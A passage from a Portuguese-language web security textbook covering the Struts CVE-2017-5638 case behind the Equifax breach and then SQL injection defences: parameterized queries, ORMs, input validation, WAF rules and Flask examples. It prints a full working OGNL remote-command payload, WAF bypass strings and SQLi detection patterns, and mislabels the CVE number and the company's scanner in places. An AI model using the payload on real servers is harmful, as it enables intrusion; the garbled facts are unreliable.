CVE-2017-5683 e uma vulnerabilidade de remote code execution (RCE) no Apache Struts 2, um framework web open-source baseado em Java. A vulnerabilidade reside na forma como o Struts manipula o Content-Type header em requisicoes multipart, permitindo a execucao de expressoes OGNL (Object-Graph Navigation Language) arbitrarias.

### Mecanismo Tecnico

O Apache Struts 2 utiliza OGNL para avaliar expressoes em varios contextos, incluindo headers HTTP. A vulnerabilidade CVE-2017-5638 permite que um atacante manipule o Content-Type header para injetar expressoes OGNL que sao avaliadas pelo servidor:

```
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','struts2-vuln')}.multipart/form-data
```

Essa expressao OGNL acessa o contexto do Struts e adiciona um header personalizado a resposta HTTP. Embora esse exemplo seja inofensivo, a mesma tecnica pode ser usada para:

- Executar comandos do sistema operacional
- Ler e escrever arquivos no servidor
- Acessar a rede interna
- Comprometer toda a base de dados

### O Ataque ao Equifax

Em 2017, o Equifax, uma das tres maiores empresas de credito dos Estados Unidos, sofreu uma das maiores violacoes de dados da historia. O ataque comprometeu dados pessoais de 147 milhoes de pessoas.

**Cronologia:**

**Maio de 2017**: O Apache publica a CVE-2017-5638 com patches de seguranca.

**29 de julho de 2017**: O Equifax detecta atividade suspeita na rede. Na epoca, o scanner de seguranca da empresa (Apache Struts 2) nao identificou a vulnerabilidade porque a assinatura de seguranca nao foi atualizada.

**Agosto de 2017**: A equipe de seguranca do Equifax descobre a brecha e comeca investigacao interna.

**7 de setembro de 2017**: O Equifax publica comunicado oficial sobre a violacao.

**Dados comprometidos:**
- 147 milhoes de registros pessoais
- Numeros de Seguranca Social (SSN)
- Numeros de cartao de credito (209 mil)
- Dados de enderecos, datas de nascimento
- Dados de driving license (17.6 mil)

### Fatores Contribuintes

**Patching deficiente**: Embora o patch estivesse disponivel desde maio de 2017, o Equifax nao aplicou a correcao em seus sistemas. A vulnerabilidade permaneceu ativa por meses.

**Falha de segmentacao de rede**: O atacante conseguiu acessar multiplos sistemas a partir do ponto de entrada inicial, indicando falta de segmentacao adequada da rede.

**Certificados SSL desatualizados**: Durante a investigacao, descobriu-se que um dos certificados SSL responsaveis pela inspecao de trafego de rede expirou 10 meses antes do ataque, impedindo a deteccao de atividade maliciosa.

**Falta de governance de seguranca**: Relatorios posteriores revelaram que o CSO (Chief Security Officer) nao tinha background tecnico, e a organizacao nao tinha processos adequados de gestao de vulnerabilidades.

### Payload do Ataque

O payload utilizado para explorar CVE-2017-5638 tipicamente incluia expressoes OGNL para execucao de comandos:

```
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

O payload:
1. Obtém acesso OGNL completo ao contexto do Struts
2. Determina o sistema operacional (Windows ou Linux)
3. Executa o comando `whoami` via ProcessBuilder
4. Redireciona a saida para o OutputStream HTTP
5. Permite ao atacante executar qualquer comando do SO

### Impacto no Negocio

**Financeiro**: O Equifax gastou mais de 1.4 bilhao de dolares em custos diretos relacionados ao breach, incluindo:

- 700 milhoes em acordo com a FTC (Federal Trade Commission)
- 425 milhoes em compensacao para consumidores
- 175 milhoes em multas regulatorias
- Investimentos adicionais em seguranca de TI

**Reputacional**: A confianca publica no Equifax foi drasticamente reduzida. O preco das acoes caiu mais de 35% nas semanas seguintes a divulgacao.

**Regulatorio**: O caso resultou em novas regulamentacoes e auditorias de seguranca em todo o setor financeiro dos EUA.

**Pessoal**: O CEO, CIO e CSO do Equifax demitiram-se apos a divulgacao da violacao.

### Lições Aprendidas

1. **Patching urgente**: Vulnerabilidades RCE devem ser corrigidas em horas, nao semanas ou meses.
2. **Segmentacao de rede**: Limitar o impacto de uma brecha isolando sistemas criticos.
3. **Inventario de dependencias**: Conhecer todas as bibliotecas e frameworks em uso.
4. **Monitoramento continuo**: Detectar atividade suspeita o mais cedo possivel.
5. **Governance de seguranca**: Ter lideres tecnicos qualificados na equipe de seguranca.

### Prevencao Especifica contra CVE-2017-5638

```java
// 1. Atualizar para versao corrigida do Struts
// Apache Struts >= 2.3.32 ou >= 2.5.10.1

// 2. Configurar restricoes OGNL
<constant name="struts.ognl.allowlist" value="true" />
<constant name="struts.ognl.allowedClasses" value="com.yourpackage.*" />

// 3. Usar Content-Security-Policy
// Adicionar header: Content-Security-Policy: default-src 'self'

// 4. Implementar WAF com regras especificas para OGNL
// Bloquear Content-Type headers contendo %{ ou #(
```

---

## 4.8 Prevencao: Parameterized Queries

### Principio Fundamental

Parameterized queries (tambem chamadas de prepared statements ou bound parameters) sao o mecanismo mais eficaz de prevencao contra SQL injection. O principio e simples: separar a estrutura da query (comandos SQL) dos dados (valores fornecidos pelo usuario).

Em uma parameterized query, a estrutura da query e definida primeiro com placeholders. Os valores sao entao fornecidos separadamente e tratados pelo motor do banco de dados como dados puros, nunca como codigo SQL.

### Como Funcionam Internamente

Quando uma parameterized query e enviada ao banco de dados, o processo ocorre em duas etapas:

**Etapa 1 — Preparacao**: A estrutura da query e enviada ao SGBD, que a parseia e compila. Os placeholders permanecem como marcadores.

```sql
-- Estrutura da query (sem dados)
SELECT * FROM users WHERE username = ? AND password = ?
```

**Etapa 2 — Vinculacao**: Os valores sao enviados separadamente. O SGBD os insere como dados, nao como estrutura.

```sql
-- Valores vinculados (tratados como dados)
username: admin
password: senha123

-- Query final executada internamente pelo SGBD
SELECT * FROM users WHERE username = 'admin' AND password = 'senha123'
```

A diferenca critica e que mesmo que o usuario envie `admin' OR '1'='1` como username, o SGBD trata isso como uma string literal, nao como codigo SQL.

### Parameterized Queries em Diferentes Linguagens

**Python com sqlite3:**

```python
import sqlite3

def get_user_vulnerable(username, password):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    # VULNERAVEL: concatenacao direta
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    cursor.execute(query)
    return cursor.fetchone()

def get_user_safe(username, password):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    # SEGURO: parameterized query
    query = "SELECT * FROM users WHERE username = ? AND password = ?"
    cursor.execute(query, (username, password))
    return cursor.fetchone()

# Uso
user = get_user_safe("admin", "senha123")
# Mesmo com input malicioso, a query e segura
user = get_user_safe("admin' OR '1'='1", "anything")
```

**Python com psycopg2 (PostgreSQL):**

```python
import psycopg2

def search_products(search_term):
    conn = psycopg2.connect("dbname=shop user=postgres")
    cursor = conn.cursor()
    # SEGURO: parameterized query com %s (estilo psycopg2)
    query = "SELECT id, name, price FROM products WHERE name ILIKE %s"
    cursor.execute(query, (f"%{search_term}%",))
    return cursor.fetchall()
```

**Python com MySQL Connector:**

```python
import mysql.connector

def get_user(username, password):
    conn = mysql.connector.connect(host='localhost', database='app')
    cursor = conn.cursor(dictionary=True)
    # SEGURO: parameterized query
    query = "SELECT * FROM users WHERE username = %s AND password = %s"
    cursor.execute(query, (username, password))
    return cursor.fetchone()
```

**Node.js com mysql2:**

```javascript
const mysql = require('mysql2/promise');

async function getUser(username, password) {
  const conn = await mysql.createConnection('mysql://user:pass@localhost/db');
  // SEGURO: parameterized query
  const [rows] = await conn.execute(
    'SELECT * FROM users WHERE username = ? AND password = ?',
    [username, password]
  );
  return rows[0];
}
```

**Node.js com pg (PostgreSQL):**

```javascript
const { Pool } = require('pg');

async function searchProducts(searchTerm) {
  const pool = new Pool({ database: 'shop' });
  // SEGURO: parameterized query
  const result = await pool.query(
    'SELECT id, name, price FROM products WHERE name ILIKE $1',
    [`%${searchTerm}%`]
  );
  return result.rows;
}
```

**Go com database/sql:**

```go
package main

import (
    "database/sql"
    "fmt"
    _ "github.com/lib/pq"
)

func getUser(db *sql.DB, username, password string) error {
    var id int
    var name string
    // SEGURO: parameterized query
    err := db.QueryRow(
        "SELECT id, name FROM users WHERE username = $1 AND password = $2",
        username, password,
    ).Scan(&id, &name)
    if err != nil {
        return err
    }
    fmt.Printf("User: %s (ID: %d)\n", name, id)
    return nil
}
```

**Java com JDBC:**

```java
import java.sql.*;

public class UserDAO {
    public User getUser(String username, String password) throws SQLException {
        Connection conn = DriverManager.getConnection("jdbc:mysql://localhost/app");
        // SEGURO: PreparedStatement
        String query = "SELECT * FROM users WHERE username = ? AND password = ?";
        PreparedStatement stmt = conn.prepareStatement(query);
        stmt.setString(1, username);
        stmt.setString(2, password);
        ResultSet rs = stmt.executeQuery();
        if (rs.next()) {
            return new User(rs.getInt("id"), rs.getString("name"));
        }
        return null;
    }
}
```

### Limitacoes de Parameterized Queries

Embora sejam a defesa primaria contra SQLi, parameterized queries nao sao uma panaceia:

**Dynamic SQL**: Quando a estrutura da query muda baseada em input do usuario (ex: colunas em ORDER BY, tabelas em FROM), parameterized queries nao podem ser usadas para esses elementos.

```python
# NAO pode ser parameterized: coluna de ORDER BY
query = f"SELECT * FROM users ORDER BY {sort_column}"  # VULNERAVEL

# Solucao: whitelist de colunas permitidas
ALLOWED_COLUMNS = {'name', 'email', 'created_at'}
if sort_column not in ALLOWED_COLUMNS:
    sort_column = 'name'
query = f"SELECT * FROM users ORDER BY {sort_column}"  # MAIS SEGURO
```

**Dynamic table names**: Nomes de tabelas nao podem ser parameterizados.

```python
# NAO pode ser parameterized: nome de tabela
table = request.args.get('table')
query = f"SELECT * FROM {table}"  # VULNERAVEL

# Solucao: whitelist de tabelas
ALLOWED_TABLES = {'users', 'products', 'orders'}
if table not in ALLOWED_TABLES:
    raise ValueError("Invalid table name")
query = f"SELECT * FROM {table}"  # MAIS SEGURO
```

---

## 4.9 Prepared Statements

### Diferenca entre Prepared Statements e Parameterized Queries

Embora os termos sejam frequentemente usados como sinominos, ha uma diferenca tecnica sutil:

**Parameterized query**: A query contem placeholders (?) ou marcadores (:name) que sao substituidos por valores. Pode ser executada uma vez com diferentes valores.

**Prepared statement**: Uma query que e compilada e armazenada pelo SGBD antes da execucao. Pode ser executada multiplas vezes com diferentes parametros, com melhor performance em queries repetidas.

Na pratica, a maioria das bibliotecas de banco de dados implementa ambos os conceitos de forma transparente.

### Implementacao por SGBD

**MySQL:**

```sql
-- Preparar statement
PREPARE stmt FROM 'SELECT * FROM users WHERE username = ? AND password = ?';

-- Vincular e executar
SET @user = 'admin';
SET @pass = 'senha123';
EXECUTE stmt USING @user, @pass;

-- Libertar
DEALLOCATE PREPARE stmt;
```

**PostgreSQL:**

```sql
-- PostgreSQL suporta named parameters
PREPARE stmt AS SELECT * FROM users WHERE username = $1 AND password = $2;
EXECUTE stmt('admin', 'senha123');

-- Liberar
DEALLOCATE stmt;
```

**SQL Server:**

```sql
-- SQL Server: sp_prepare e sp_execute
DECLARE @handle INT;
EXEC sp_prepare @handle OUTPUT,
    @params = N'@username NVARCHAR(50), @password NVARCHAR(50)',
    @stmt = N'SELECT * FROM users WHERE username = @username AND password = @password';

EXEC sp_execute @handle, N'admin', N'senha123';

EXEC sp_unprepare @handle;
```

### Prepared Statements em ORMs

A maioria dos ORMs modernos implementa prepared statements por padrao:

**SQLAlchemy (Python):**

```python
from sqlalchemy import create_engine, text

engine = create_engine('postgresql://user:pass@localhost/db')

# SQLAlchemy usa parameterized queries por padrao
with engine.connect() as conn:
    result = conn.execute(
        text("SELECT * FROM users WHERE username = :username"),
        {"username": "admin"}
    )
    user = result.fetchone()

# Em queries construidas com ORM
from sqlalchemy.orm import Session
from models import User

with Session(engine) as session:
    user = session.query(User).filter(User.username == "admin").first()
    # SQLAlchemy gera parameterized query automaticamente
```

**Sequelize (Node.js):**

```javascript
const { Sequelize, Model, DataTypes } = require('sequelize');

const sequelize = new Sequelize('database', 'user', 'pass', {
  dialect: 'mysql'
});

class User extends Model {}
User.init({
  username: DataTypes.STRING,
  password: DataTypes.STRING
}, { sequelize });

// Sequelize usa parameterized queries por padrao
const user = await User.findOne({
  where: { username: 'admin' }
});
// Gerado: SELECT * FROM users WHERE username = ?
```

**GORM (Go):**

```go
import (
    "gorm.io/driver/mysql"
    "gorm.io/gorm"
)

type User struct {
    gorm.Model
    Username string
    Password string
}

func main() {
    db, _ := gorm.Open(mysql.Open("user:pass@tcp(127.0.0.1:3306)/db"), &gorm.Config{})
    
    var user User
    // GORM usa parameterized queries por padrao
    db.Where("username = ?", "admin").First(&user)
}
```

### Erros Comuns com Prepared Statements

**Concatenacao incorreta de nomes de tabelas:**

```python
# ERRADO: tentar usar placeholder para nome de tabela
cursor.execute("SELECT * FROM ? WHERE id = ?", (table_name, id))

# CORRETO: whitelist para nomes de tabelas
ALLOWED_TABLES = {'users', 'products'}
if table_name not in ALLOWED_TABLES:
    raise ValueError("Invalid table")
cursor.execute(f"SELECT * FROM {table_name} WHERE id = ?", (id,))
```

**Concatenacao incorreta de ORDER BY:**

```python
# ERRADO: placeholder para ORDER BY nao funciona na maioria dos SGBDs
cursor.execute("SELECT * FROM users ORDER BY ?", (sort_column,))

# CORRETO: whitelist para colunas de ORDER BY
ALLOWED_COLUMNS = {'name', 'email', 'created_at'}
if sort_column not in ALLOWED_COLUMNS:
    sort_column = 'name'
cursor.execute(f"SELECT * FROM users ORDER BY {sort_column}")
```

**Uso incorreto de FORMAT ou CONCAT em queries:**

```python
# ERRADO: usando FORMAT para construir query
cursor.execute(
    "SELECT * FROM users WHERE name = '{}'".format(user_input)
)

# ERRADO: usando CONCAT no SQL para concatenar dados
cursor.execute(
    "SELECT * FROM users WHERE name = CONCAT('%', ?, '%')",
    (search_term,)
)
# Na verdade isso e SEGURO - CONCAT esta no lado do SGBD
```

---

## 4.10 ORM Security

### Riscos em ORMs

ORMs (Object-Relational Mappers) sao frequentemente citados como solucao para SQLi, mas nao sao infaliveis. Varios padrões de uso podem introduzir vulnerabilidades:

**Raw queries:**

```python
# SQLAlchemy: raw query VULNERAVEL
from sqlalchemy import text

def search_unsafe(session, user_input):
    # ERRADO: interpolar input diretamente em raw query
    result = session.execute(text(f"SELECT * FROM users WHERE name = '{user_input}'"))
    return result.fetchall()

# SQLAlchemy: raw query SEGURO
def search_safe(session, user_input):
    # CORRETO: usar parameterized query
    result = session.execute(text("SELECT * FROM users WHERE name = :name"), {"name": user_input})
    return result.fetchall()
```

**Django ORM:**

```python
# Django: raw query VULNERAVEL
from django.db import connection

def get_users_unsafe(username):
    with connection.cursor() as cursor:
        cursor.execute(f"SELECT * FROM auth_user WHERE username = '{username}'")
        return cursor.fetchall()

# Django: raw query SEGURO
def get_users_safe(username):
    with connection.cursor() as cursor:
        cursor.execute("SELECT * FROM auth_user WHERE username = %s", [username])
        return cursor.fetchall()

# Django: ORM query SEGURO (por padrao)
from django.contrib.auth.models import User

def get_user_orm(username):
    return User.objects.filter(username=username)  # SEGURO por padrao
```

**Django extra() e raw():**

```python
# Django: extra() e raw() podem ser vulneraveis se usados incorretamente

# VULNERAVEL
User.objects.extra(where=[f"username = '{user_input}'"])

# SEGURO
User.objects.extra(where=["username = %s"], params=[user_input])
```

**SQLAlchemy text() e execute():**

```python
# SQLAlchemy: text() com interpolação VULNERAVEL
session.execute(text(f"SELECT * FROM users WHERE name = '{name}'"))

# SQLAlchemy: text() SEGURO com bind parameters
session.execute(text("SELECT * FROM users WHERE name = :name"), {"name": name})
```

**Sequelize:**

```javascript
// Sequelize: query() VULNERAVEL
sequelize.query(`SELECT * FROM users WHERE name = '${name}'`);

// Sequelize: query() SEGURO com replacements
sequelize.query("SELECT * FROM users WHERE name = :name", {
  replacements: { name: name },
  type: sequelize.QueryTypes.SELECT
});

// Sequelize: findByQuery SEGURO
User.findOne({ where: { name: name } });  // SEGURO por padrao
```

### Dynamic Query Building

Construcao dinamica de queries e uma area onde ORMs podem ser especialmente perigosos:

```python
# SQLAlchemy: construcao dinamica VULNERAVEL
def build_query_unsafe(filters):
    query = "SELECT * FROM users WHERE 1=1"
    for key, value in filters.items():
        # ERRADO: concatenar filtros diretamente
        query += f" AND {key} = '{value}'"
    return query

# SQLAlchemy: construcao dinamica SEGURO
from sqlalchemy import and_

def build_query_safe(session, filters):
    query = session.query(User)
    ALLOWED_COLUMNS = {'username', 'email', 'status'}
    for key, value in filters.items():
        if key in ALLOWED_COLUMNS:
            query = query.filter(getattr(User, key) == value)
    return query.all()

# SQLAlchemy: construcao dinamica SEGURO com text()
def build_query_safe_text(session, filters):
    conditions = []
    params = {}
    ALLOWED_COLUMNS = {'username', 'email', 'status'}
    for key, value in filters.items():
        if key in ALLOWED_COLUMNS:
            conditions.append(f"{key} = :{key}")
            params[key] = value
    where_clause = " AND ".join(conditions) if conditions else "1=1"
    return session.execute(
        text(f"SELECT * FROM users WHERE {where_clause}"),
        params
    )
```

### ORM Injection em Frameworks Especificos

**Laravel Eloquent (PHP):**

```php
// VULNERAVEL: query raw com interpolação
$results = DB::select("SELECT * FROM users WHERE name = '$name'");

// SEGURO: query raw com binding
$results = DB::select("SELECT * FROM users WHERE name = ?", [$name]);

// SEGURO: Eloquent query builder
$results = User::where('name', $name)->get();

// VULNERAVEL: orderBy com input
$results = User::orderByRaw($sortColumn)->get();

// SEGURO: whitelist
$allowed = ['name', 'email', 'created_at'];
$column = in_array($sortColumn, $allowed) ? $sortColumn : 'name';
$results = User::orderBy($column)->get();
```

**ActiveRecord (Ruby on Rails):**

```ruby
# VULNERAVEL: find_by_sql com interpolação
User.find_by_sql("SELECT * FROM users WHERE name = '#{name}'")

# SEGURO: find_by_sql com binding
User.find_by_sql(["SELECT * FROM users WHERE name = ?", name])

# SEGURO: ActiveRecord query
User.where(name: name)
User.where("name = ?", name)
User.where(name: [name1, name2])

# VULNERAVEL: order com input direto
User.order("#{params[:sort]}")

# SEGURO: whitelist
allowed = ['name', 'email', 'created_at']
sort = allowed.include?(params[:sort]) ? params[:sort] : 'name'
User.order(sort)
```

### Principios de Seguranca em ORMs

1. **Evitar raw queries sempre que possivel**: Usar a API do ORM em vez de queries SQL diretas.
2. **Usar bind parameters em raw queries**: Quando raw queries sao necessarias, sempre usar parameterized queries.
3. **Validar e sanitizar dynamic query building**: Whitelists para colunas, tabelas, e operadores.
4. **Auditar funcoes de query building**: Identificar todas as partes do codigo que constroem queries dinamicamente.
5. **Testar com fuzzing**: Submeter todas as entradas a fuzzing para detectar SQLi potenciais.

---

## 4.11 Input Validation

### Principe Defense-in-Depth

Input validation e uma camada adicional de defesa que complementa parameterized queries. Mesmo com parameterized queries, a validacao de entrada ajuda a prevenir outros tipos de ataque e fornece uma segunda camada de protecao.

### Tipos de Validacao

**Whitelist (lista de permitidos)**: Aceitar apenas entradas que correspondem a um padrao conhecido.

```python
import re

def validate_username(username):
    # Whitelist: apenas caracteres alfanumericos e underscore
    if not re.match(r'^[a-zA-Z0-9_]{3,50}$', username):
        raise ValueError("Invalid username format")
    return username

def validate_email(email):
    # Whitelist: padrao de email
    if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
        raise ValueError("Invalid email format")
    return email

def validate_id(user_id):
    # Whitelist: apenas numeros
    if not re.match(r'^[0-9]+$', str(user_id)):
        raise ValueError("Invalid ID format")
    return int(user_id)
```

**Blacklist (lista de proibidos)**: Rejeitar entradas que contem caracteres ou padroes perigosos.

```python
import re

def validate_input_blacklist(input_str):
    # Blacklist: rejeitar caracteres perigosos
    dangerous_patterns = [
        r"['\";]",           # Aspas e ponto-e-virgula
        r"--",               # Comentario SQL
        r"/\*", r"\*/",      # Comentario SQL
        r"union\s+select",   # UNION SELECT
        r"drop\s+table",     # DROP TABLE
        r"insert\s+into",    # INSERT INTO
        r"update\s+\w+\s+set", # UPDATE SET
        r"delete\s+from",    # DELETE FROM
        r"exec\s*\(",        # EXEC
        r"xp_cmdshell",      # SQL Server command execution
    ]
    
    for pattern in dangerous_patterns:
        if re.search(pattern, input_str, re.IGNORECASE):
            raise ValueError(f"Potentially dangerous input detected")
    
    return input_str
```

### Validacao por Contexto

**Parametros numericos:**

```python
def validate_numeric_param(value):
    """Valida que um parametro e numerico."""
    try:
        num = int(value)
        if num < 0 or num > 1000000:
            raise ValueError("Value out of range")
        return num
    except (ValueError, TypeError):
        raise ValueError("Invalid numeric value")
```

**Parametros de string:**

```python
def validate_string_param(value, max_length=255):
    """Valida e sanitiza um parametro de string."""
    if not isinstance(value, str):
        raise ValueError("Expected string")
    if len(value) > max_length:
        raise ValueError(f"String exceeds max length of {max_length}")
    # Remover caracteres perigosos
    sanitized = value.replace("'", "").replace('"', '').replace(';', '')
    return sanitized
```

**Datas:**

```python
from datetime import datetime

def validate_date(date_str):
    """Valida formato de data."""
    try:
        return datetime.strptime(date_str, '%Y-%m-%d')
    except ValueError:
        raise ValueError("Invalid date format (expected YYYY-MM-DD)")
```

### Validacao em Camadas

A abordagem mais robusta combina validacao em multiplos niveis:

```python
# Camada 1: Validacao no controller/API
@app.route('/users')
def list_users():
    sort_by = request.args.get('sort', 'name')
    ALLOWED_COLUMNS = {'name', 'email', 'created_at'}
    if sort_by not in ALLOWED_COLUMNS:
        sort_by = 'name'
    
    page = request.args.get('page', 1, type=int)
    if page < 1:
        page = 1
    if page > 1000:
        page = 1000
    
    # Passar valores validados para a service layer
    return user_service.list_users(sort_by=sort_by, page=page)

# Camada 2: Validacao na service layer
class UserService:
    def list_users(self, sort_by, page):
        # Validacao adicional (defense-in-depth)
        ALLOWED_COLUMNS = {'name', 'email', 'created_at'}
        if sort_by not in ALLOWED_COLUMNS:
            raise ValueError("Invalid sort column")
        
        # Passar para a repository layer com valores validados
        return self.user_repository.list(sort_by=sort_by, page=page)

# Camada 3: Validacao na repository layer
class UserRepository:
    def list(self, sort_by, page):
        # Ultima verificacao antes de construir a query
        ALLOWED_COLUMNS = {'name', 'email', 'created_at'}
        if sort_by not in ALLOWED_COLUMNS:
            sort_by = 'name'
        
        query = f"SELECT * FROM users ORDER BY {sort_by} LIMIT 20 OFFSET ?"
        return self.db.execute(query, (page * 20,))
```

### Validacao em APIs REST

```python
from flask import Flask, request, jsonify
from marshmallow import Schema, fields, validate

app = Flask(__name__)

# Schema de validacao com Marshmallow
class UserSearchSchema(Schema):
    query = fields.Str(required=True, validate=validate.Length(min=1, max=100))
    sort_by = fields.Str(
        validate=validate.OneOf(['name', 'email', 'created_at']),
        missing='name'
    )
    page = fields.Int(validate=validate.Range(min=1, max=1000), missing=1)
    per_page = fields.Int(validate=validate.Range(min=1, max=100), missing=20)

@app.route('/api/users/search', methods=['GET'])
def search_users():
    schema = UserSearchSchema()
    errors = schema.validate(request.args)
    if errors:
        return jsonify({"errors": errors}), 400
    
    data = schema.load(request.args)
    # Valores validados e sanitizados
    users = user_service.search(
        query=data['query'],
        sort_by=data['sort_by'],
        page=data['page'],
        per_page=data['per_page']
    )
    return jsonify(users)
```

### Validacao em GraphQL

```python
import graphene

class UserSearchInput(graphene.InputObjectType):
    query = graphene.String(required=True)
    sort_by = graphene.String(default_value='name')
    page = graphene.Int(default_value=1)

class Query(graphene.ObjectType):
    search_users = graphene.List(UserSearchType, search_input=UserSearchInput())
    
    def resolve_search_users(self, info, search_input):
        # Validacao
        ALLOWED_SORT = ['name', 'email', 'created_at']
        sort_by = search_input.sort_by if search_input.sort_by in ALLOWED_SORT else 'name'
        page = max(1, min(1000, search_input.page))
        
        return user_service.search(
            query=search_input.query,
            sort_by=sort_by,
            page=page
        )
```

---

## 4.12 WAF Rules

### O Papel do WAF

Web Application Firewalls (WAFs) atuam como uma camada de protecao entre a Internet e a aplicacao, inspecionando o trafego HTTP/HTTPS e bloqueando requisicoes maliciosas. WAFs podem detectar e bloquear padroes de SQL injection em tempo real.

### Tipos de WAF

**Network-based WAF**: Hardware fisico ou virtual instalado na rede. Exemplos: F5 ASM, Imperva SecureSphere, Citrix NetScaler.

**Cloud-based WAF**: Servico na nuvem que intercepta trafego antes de alcancar o servidor. Exemplos: AWS WAF, Cloudflare WAF, Akamai Kona.

**Host-based WAF**: Software instalado diretamente no servidor. Exemplos: ModSecurity, NAXSI, ASP.NET Request Filtering.

### Regras ModSecurity

ModSecurity e o WAF open-source mais utilizado, frequentemente em conjunto com o Apache ou Nginx:

```
# Regra basica para detectar UNION SELECT
SecRule ARGS|ARGS_NAMES|REQUEST_URI|REQUEST_HEADERS \
    "(?i:(?:union\s+(?:all\s+)?select\s+))" \
    "id:1001,phase:2,deny,status:403,\
    msg:'SQL Injection - UNION SELECT detected',\
    logdata:'%{MATCHED_VAR}'"

# Regra para detectar OR 1=1
SecRule ARGS|ARGS_NAMES \
    "(?i:\bor\b\s+\d+\s*=\s*\d+)" \
    "id:1002,phase:2,deny,status:403,\
    msg:'SQL Injection - OR condition detected',\
    logdata:'%{MATCHED_VAR}'"

# Regra para detectar comentários SQL
SecRule ARGS|REQUEST_URI \
    "(?i:(?:--|/\*|\*/))" \
    "id:1003,phase:2,deny,status:403,\
    msg:'SQL Injection - SQL comment detected',\
    logdata:'%{MATCHED_VAR}'"

# Regra para detectar funções perigosas
SecRule ARGS|REQUEST_URI \
    "(?i:(?:concat|benchmark|sleep|waitfor|version|user|database|information_schema))" \
    "id:1004,phase:2,deny,status:403,\
    msg:'SQL Injection - Dangerous function detected',\
    logdata:'%{MATCHED_VAR}'"

# Regra para detectar quotes e bypass
SecRule ARGS \
    "(?:['\"](?:\s*(?:or|and)\s*)['\"][^'\"]*['\"])" \
    "id:1005,phase:2,deny,status:403,\
    msg:'SQL Injection - Quote bypass detected',\
    logdata:'%{MATCHED_VAR}'"
```

### Regras AWS WAF

```json
{
  "Name": "SQLInjectionRule",
  "Priority": 1,
  "Action": "BLOCK",
  "Statement": {
    "ManagedRuleGroupStatement": {
      "VendorName": "AWS",
      "Name": "AWSManagedRulesSQLiRuleSet"
    }
  },
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "SQLInjectionMetric"
  }
}
```

### Regras Cloudflare

Cloudflare oferece regras pre-definidas para SQLi:

```python
# Cloudflare WAF Rule (expression-based)
# Bloquear SQLi em URI
http.request.uri contains "' OR '1'='1" or
http.request.uri contains "UNION SELECT" or
http.request.uri contains "1; DROP TABLE"

# Bloquear SQLi em body
http.request.body contains "' OR '1'='1" or
http.request.body contains "UNION SELECT"
```

### Limitacoes de WAFs

**Bypasses comuns:**

```sql
# Encoding para bypass basico
%27%20OR%201%3D1    (URL encoding: ' OR 1=1)
&#39; OR 1=1         (HTML encoding)

# Case variation
uNiOn SeLeCt

# Comentarios inline
UN/**/ION SEL/**/ECT

# Alternativas de sintaxe
' /*!50000union*/ select 1,2,3--
' || '1'='1   (usando operador OR alternativo)

# Novas linhas e espacos
'
UNION
SELECT
1,2,3
--
```

**Outras limitacoes:**
- **Falsos positivos**: WAFs podem bloquear requisicoes legitimas que contem padroes similares a SQLi.
- **Performance**: A inspecao de cada requisicao adiciona latencia.
- **Evasao avanzada**: Atacantes sofisticados podem encontrar bypasses para regras WAF.
- **Dependencia**: Um WAF nao substitui parameterized queries. E uma camada adicional, nao a defesa primaria.

---

## 4.13 Exemplos em Python

### Flask com SQLite

```python
from flask import Flask, request, jsonify
import sqlite3
import hashlib
import os
import re

app = Flask(__name__)

def get_db():
    conn = sqlite3.connect('app.db')
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            email TEXT NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.execute('''
        CREATE TABLE IF NOT EXISTS products (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            description TEXT,
            price DECIMAL(10,2),
            category TEXT
        )
    ''')
    conn.commit()
    conn.close()

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')
    
    # VULNERAVEL: concatenacao direta
    # conn = get_db()
    # query = f"SELECT * FROM users WHERE username = '{username}' AND password_hash = '{password}'"
    # user = conn.execute(query).fetchone()
    
    # SEGURO: parameterized query
    conn = get_db()
    password_hash = hashlib.sha256(password.encode()).hexdigest()
    user = conn.execute(
        "SELECT * FROM users WHERE username = ? AND password_hash = ?",
        (username, password_hash)
    ).fetchone()
    conn.close()
    
    if user:
        return jsonify({"success": True, "user_id": user["id"]})
    return jsonify({"success": False, "error": "Invalid credentials"}), 401

@app.route('/products/search')
def search_products():
    search_term = request.args.get('q', '')
    
    # Validar entrada
    if not search_term or len(search_term) > 100:
        return jsonify({"error": "Invalid search term"}), 400
    
    # SEGURO: parameterized query com LIKE
    conn = get_db()
    products = conn.execute(
        "SELECT id, name, price, category FROM products WHERE name LIKE ?",
        (f"%{search_term}%",)
    ).fetchall()
    conn.close()
    
    return jsonify([dict(p) for p in products])

@app.route('/users/list')
def list_users():
    # Validar e sanitizar param de ordenacao
    sort_by = request.args.get('sort', 'username')
    ALLOWED_COLUMNS = {'username', 'email', 'created_at'}
    if sort_by not in ALLOWED_COLUMNS:
        sort_by = 'username'
    
    # Validar pagina
